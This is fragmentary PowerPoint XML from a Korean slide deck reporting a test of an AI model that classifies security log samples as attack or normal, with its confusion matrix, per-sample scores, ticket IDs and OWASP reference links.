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c924e08cb4a05" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="/docProps/app.xml" Id="R4850307fa1e642cb" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="/ppt/presentation.xml" Id="R2d21dbe96ece49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720053d424849"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="R57a73ca88d84404c"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="256" r:id="Rd7330871eef24623"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="257" r:id="R02b5a527f2d9425c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="258" r:id="R9a1410a7c0784e90"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="259" r:id="R7191461714bb4fec"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="260" r:id="R793e26a34a8a4cc4"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="261" r:id="R0253a6b10b9c4bc9"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="262" r:id="R8662d19175434e42"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="263" r:id="Ra68e1261d7834559"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="264" r:id="Rbc61fa122eec403b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="265" r:id="R7ed4c2f53c59482e"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="266" r:id="Raa2e00978494436d"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="267" r:id="R3705bc00efa94aa6"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="268" r:id="Rb958170e65304e3a"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="269" r:id="Ra3f6dedd011a4c4e"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="270" r:id="R95a9d1fa892644e0"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="271" r:id="R40a6432105c84b4b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="272" r:id="R857f5aced36c4e74"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="273" r:id="R5408a8bbac6c46cd"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="274" r:id="R06bf6c13d42f4cdb"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="275" r:id="R31afb5860ba0443a"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="276" r:id="R1c1fef0a8ce24794"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="277" r:id="R9f7c63ce13b949be"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="278" r:id="Rf29721cda18f4af4"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="279" r:id="Rac77879b9f484a6b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="280" r:id="Re97fdd351bff4a4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b5e2e4cfb48e9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="/ppt/slideMasters/slideMaster1.xml" Id="Rbeb720053d424849" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R57a73ca88d84404c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="/ppt/presProps.xml" Id="R1f1e93a877d843e7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="/ppt/tableStyles.xml" Id="Rf1433014860249e8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide1.xml" Id="Rd7330871eef24623" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide2.xml" Id="R02b5a527f2d9425c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide3.xml" Id="R9a1410a7c0784e90" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide4.xml" Id="R7191461714bb4fec" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide5.xml" Id="R793e26a34a8a4cc4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide6.xml" Id="R0253a6b10b9c4bc9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide7.xml" Id="R8662d19175434e42" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide8.xml" Id="Ra68e1261d7834559" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide9.xml" Id="Rbc61fa122eec403b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide10.xml" Id="R7ed4c2f53c59482e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide11.xml" Id="Raa2e00978494436d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide12.xml" Id="R3705bc00efa94aa6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide13.xml" Id="Rb958170e65304e3a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide14.xml" Id="Ra3f6dedd011a4c4e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide15.xml" Id="R95a9d1fa892644e0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide16.xml" Id="R40a6432105c84b4b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide17.xml" Id="R857f5aced36c4e74" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide18.xml" Id="R5408a8bbac6c46cd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide19.xml" Id="R06bf6c13d42f4cdb" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide20.xml" Id="R31afb5860ba0443a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide21.xml" Id="R1c1fef0a8ce24794" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide22.xml" Id="R9f7c63ce13b949be" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide23.xml" Id="Rf29721cda18f4af4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide24.xml" Id="Rac77879b9f484a6b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide25.xml" Id="Re97fdd351bff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c45375f2a4b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cc599af3e42d7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Raa153dc06e4a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b2fd7bacf48ff" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc2c40fb9c9de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a6c8c7bd7448f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf7b7744fd5e4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ee1c565ad4c11" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R1ed882a21c3544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ffdb9fd4e4615" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R0deada26b9d34d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d26a84406c4f98" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R99143e081b4d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0c65675b5426a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R0664fdf1614b4d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8d41875fb34286" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R76cf396f10d648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00b85fe7324421" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2313072825b24e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e4de9fe9c94c48" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R7ad35d1fdf27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a206f44ad74230" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R6b0f5a6f8f9d48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0a0cea5f2e4068" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R04d5775ab75942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3ba8eea28e4dba" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R9ff387b6023f4b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0a333dc9164b68" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc25bb95d2dee41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146cdcc1fe48e1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R99fe817ec6ab4f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d09a39a01549ed" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R9451ad19748140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eaf68c65d6402d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf325681bbc1941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cde775df2d4d73" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rcdc92172913147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4f1741d4f846e2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R394ecabf4ca14d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ca309e2b4444a6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rbb5ba29a33744c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9840ac615d4829" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R30163b1312004c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78fc1d3df24f55" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rd77953347ce549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3e655500314a84" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2b93c2942ef24a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c3288bed394ef8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rfa29330ae64247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b1a935aa3649a5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R34cb2fee0d25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기존 테스트 과정과 결과를 정리한 자료. 작성일 2026-09-09. 현재 세션에서 서버 재전송·등록·플레이북 실행은 수행하지 않았다. 표기한 서버와 이름은 사용자 제공 정보다.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 근거: TP=10, FP=6, TN=4, FN=0. Accuracy=(TP+TN)/20=70%; TPR=TP/(TP+FN)=100%; Precision=TP/(TP+FP)=62.5%; FPR=FP/(FP+TN)=60%. 공격 라벨은 공격 의도·모사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판정은 보안 정책 적합성 또는 무해성을 인증하는 의미가 아니다. 공격 판정은 공격 의도·모사 패턴 기준이다. 192.0.2.0/24는 RFC 5737의 문서용 TEST-NET-1 주소.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설명을 재구성한 기존 테스트 흐름. 현재 세션에서 서버 연결, 로그 전송, 파서/이벤트 등록은 수행하지 않았다. LogGenerator README.md 264–275행은 프로토콜 선택, Host/Port 설정, 카탈로그·샘플 선택, IP/날짜, EPS, 전송 및 총 로그 수 확인 순서를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 정보: LogGenerator 파서, AITEST 일반 이벤트, AI TEST 티켓. 현재 설정값을 직접 조회하지 않았다. eyeCloudXOAR-playbook-guide_v4_ko.pdf p74, p77–80: 정오탐 분석과 payload, 결과 및 수동 피드백. 활성 알고리즘/모델 입력 매핑은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첨부 원본 PNG codex-clipboard-b275dc3b-4de1-4eb9-9aa0-9cb439990e1d.png. 화면 #3 이름은 말줄임 처리되어 있으므로 전체 명칭은 사용자 제공 티켓 상태 “정오탐 피드백 데이터 저장”을 따른다. 매뉴얼의 다른 명칭으로 교체하지 않았다. 현재 화면은 저장 완료 또는 재학습 완료의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티켓 목록 전문. 각 티켓의 제목 AI TEST, 담당자 미지정, 상태 분석/대응 ( 정오탐 피드백 데이터 저장 ). 날짜는 모두 2026-09-08. 두 목록을 정상군/공격군에 임의 매핑하지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000380 14:19:07</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000379 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000378 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000377 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000376 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000375 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000374 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000373 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000372 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000371 14:18:13</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000456 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000455 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000454 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000452 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000451 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000450 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000449 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000448 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000447 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000446 16:54:54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계산: {"counts":{"TP":10,"FP":6,"TN":4,"FN":0},"metrics":{"accuracy":0.7,"recall":1,"precision":0.625,"fpr":0.6,"specificity":0.4,"f1":0.7692307692307693}}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Accuracy=(TP+TN)/(TP+TN+FP+FN). Recall=TP/(TP+FN). Precision=TP/(TP+FP). FPR=FP/(FP+TN). Specificity=TN/(TN+FP). F1=2TP/(2TP+FP+FN). 혼동행렬 정의는 eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80과 부합한다.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S01 수동=정상 모델=공격 화면값=0.47 FP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수동=정상 모델=정상 화면값=0.39 TN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수동=정상 모델=공격 화면값=0.48 FP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수동=정상 모델=정상 화면값=0.30 TN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수동=정상 모델=공격 화면값=0.31 FP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S06 수동=정상 모델=공격 화면값=0.60 FP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수동=정상 모델=정상 화면값=0.35 TN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수동=정상 모델=공격 화면값=0.43 FP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수동=정상 모델=정상 화면값=0.27 TN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수동=정상 모델=공격 화면값=0.65 FP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S11 수동=공격 모델=공격 화면값=0.43 TP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수동=공격 모델=공격 화면값=0.46 TP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수동=공격 모델=공격 화면값=0.37 TP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수동=공격 모델=공격 화면값=0.67 TP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수동=공격 모델=공격 화면값=0.51 TP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S16 수동=공격 모델=공격 화면값=0.60 TP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수동=공격 모델=공격 화면값=0.63 TP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수동=공격 모델=공격 화면값=0.45 TP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수동=공격 모델=공격 화면값=0.57 TP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수동=공격 모델=공격 화면값=1.00 TP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화면 값은 사용자 명칭 “정확도”를 보존한다. 산식이 제공되지 않았으므로 확률, 신뢰도, 유사도로 단정하지 않는다. 각 값의 단순 평균은 모델 정확도가 아니다. 점수와 판정은 사용자 제공 원값이며 차트 데이터는 편집 가능한 리터럴 값이다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S01 0.47 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S02 0.39 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S03 0.48 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S04 0.30 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S05 0.31 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S06 0.60 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S07 0.35 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S08 0.43 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S09 0.27 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S10 0.65 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S11 0.43 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S12 0.46 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S13 0.37 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S14 0.67 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S15 0.51 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S16 0.60 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S17 0.63 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S18 0.45 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S19 0.57 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S20 1.00 공격 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권고는 관측 결과(FP 6건)에 대한 후속 검증 제안이며 이미 수행했다는 의미가 아니다. eyeCloudXOARforAll-in-one_v4_ko.pdf p263–266은 Label 변경, 임시저장, Feedback, 강화학습의 별도 절차를 설명한다. 학습/평가 분리 여부와 활성 모델 메타데이터는 사용자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>화면 값=0.47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>화면 값=0.39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>화면 값=0.48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>화면 값=0.30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화면 값=0.31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>화면 값=0.60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>화면 값=0.35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>화면 값=0.43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>화면 값=0.27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화면 값=0.65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>화면 값=0.43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>화면 값=0.46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>화면 값=0.37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>화면 값=0.67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화면 값=0.51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>화면 값=0.60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>화면 값=0.63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>화면 값=0.45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>화면 값=0.57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화면 값=1.00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자료: 이 대화의 20개 샘플 및 20개 티켓, 첨부 원본 PNG.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>로컬 자료: C:/Users/user/Desktop/project/LogGenerator/README.md 264–275행. C:/Users/user/Desktop/AI 서버/eyeCloudXOARforAll-in-one_v4_ko.pdf p263–269. C:/Users/user/Desktop/AI 서버/eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>웹 1차 출처(2026-09-09 확인):</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>sql: https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>path: https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>crlf: https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>xxe: 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ssti: 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ssrf: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>log4j: https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>command: 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probes: https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>auth: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>rfc: https://www.rfc-editor.org/info/rfc5737/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>이전 로컬 ai_model_detection_samples.json은 메서드·헤더·정상군이 현재 제공 데이터와 달라 평가에 대체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e5d056eca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9357e80164859" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="/ppt/slideLayouts/slideLayout1.xml" Id="R6155efe2bd6c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5efe2bd6c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f0a7aeaea4ff5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide1.xml" Id="R1b980590e98a46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07eb4ae33461e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide2.xml" Id="Rc30319795e54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8576987b42d6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide3.xml" Id="Rfc2912554d8f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7b31378864a08" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide4.xml" Id="Raacfb2ac0ee94f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fc33610654465" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide5.xml" Id="R3e71ad80628646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bfc251ed94386" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/ppt/media/image.png" Id="Rf192d1f35f1f4e12" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide6.xml" Id="R7ef058f90687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da552a05c4794" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide7.xml" Id="R8b8c131d038b47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3a8a81cf8480c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide8.xml" Id="R5baf6569cfe147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a4a9faa094f8f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide9.xml" Id="Reaad8d11b744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baefeb364bd0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide10.xml" Id="R0510681cc75949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5f9ad0fed4054" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide11.xml" Id="Rc49c0c916ef049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f8107086c46dd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide12.xml" Id="R47f8f5185b8e4e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453fdae594f4a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="/ppt/slides/charts/chart1.xml" Id="R542fc4fcc9d240f8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide13.xml" Id="Ref09504eb55b41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483d20ae842d6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide14.xml" Id="R96076ea147a04d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959aa5d6f4eda" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide15.xml" Id="R44e0ac99d0d040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9018a92f4691" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide16.xml" 